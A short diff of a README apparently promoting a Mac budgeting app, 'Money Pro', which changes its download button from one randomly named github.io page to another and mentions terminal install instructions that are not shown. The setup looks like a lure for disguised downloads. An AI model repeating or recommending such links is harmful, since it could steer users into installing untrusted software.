@@ -2,7 +2,7 @@
 
 Manage your finances effortlessly with Money Pro for Mac! Follow the simple instructions below to install this powerful budgeting app and take control of your money.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/moneypro)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/moneypro)
 
 If the download button doesn't work, follow the terminal installation instructions below.
 
